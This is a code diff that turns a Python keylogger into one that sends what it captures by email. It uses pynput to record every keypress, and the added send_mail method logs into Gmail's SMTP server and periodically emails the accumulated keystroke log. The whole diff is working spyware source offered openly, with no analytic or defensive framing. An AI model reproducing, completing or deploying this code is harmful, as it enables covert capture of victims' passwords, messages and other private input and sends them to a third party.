@@ -2,40 +2,54 @@
 
 import pynput.keyboard
 import threading
-
-logger = ""
+import smtplib
 
 class Keylogger:
+    def __init__(self, time_interval, email, passwd):
+        self.logger = "Keylogger-Started"
+        self.interval = time_interval
+        self.email = email
+        self.passwd = passwd
+
+    def append_to_logger(self, string):
+        self.logger = self.logger + string
+
     def process_key_press(self, key):
-        global logger
         try:
-            logger = logger + str(key.char)
+            current_key = str(key.char)
         except AttributeError:
             if key == key.space:
-                logger = logger + " Sp "
+                current_key = " "
             elif key == key.enter:
-                logger = logger + " Etr "
+                current_key = " Etr "
             elif key == key.tab:
-                logger = logger + " Tb "
+                current_key = " Tb "
             elif key == key.backspace:
-                logger = logger + " Bk "
+                current_key = " Bk "
             elif key == key.right:
-                logger = logger + " rt "
+                current_key = " rt "
             elif key == key.left:
-                logger = logger + " lt "
+                current_key = " lt "
             elif key == key.up:
-                logger = logger + " up "
+                current_key = " up "
             elif key == key.down:
-                logger = logger + " dn "
+                current_key = " dn "
             else:
-                logger = logger + " " + str(key) + " "
+                current_key = " " + str(key) + " "
+        self.append_to_logger(current_key)
 
     def report(self):
-        global logger
-        print(logger)
-        log = ""
-        timer = threading.Timer(5, self.report)
+        self.send_mail(self.email, self.passwd, "\n\n" + self.logger)
+        self.logger = ""
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
+    
+    def send_mail(self, email, passwd, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, passwd)
+        server.sendmail(email, email, message)
+        server.quit()
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
